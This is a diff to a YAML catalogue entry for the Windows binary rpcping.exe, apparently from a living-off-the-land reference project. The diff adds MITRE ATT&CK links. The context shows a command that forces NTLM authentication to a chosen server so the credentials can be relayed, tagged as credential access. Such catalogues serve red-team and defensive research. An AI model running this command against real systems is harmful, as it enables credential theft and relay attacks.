@@ -10,6 +10,7 @@ Commands:
     Category: Credentials
     Privileges: User
     MitreID: T1003
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1003
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
     Description: Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).
@@ -17,6 +18,7 @@ Commands:
     Category: Credentials
     Privileges: User
     MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\rpcping.exe
